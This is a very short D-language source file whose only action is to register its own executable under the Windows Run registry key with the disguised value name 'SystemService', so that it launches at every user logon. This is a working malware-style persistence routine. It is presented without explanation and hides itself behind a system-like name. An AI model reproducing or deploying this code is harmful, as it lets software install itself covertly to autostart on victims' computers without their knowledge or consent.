import std.process;
import std.file;
void main(){auto e=thisExePath();executeShell(`reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemService" /t REG_SZ /d "`~e~`" /f`);}
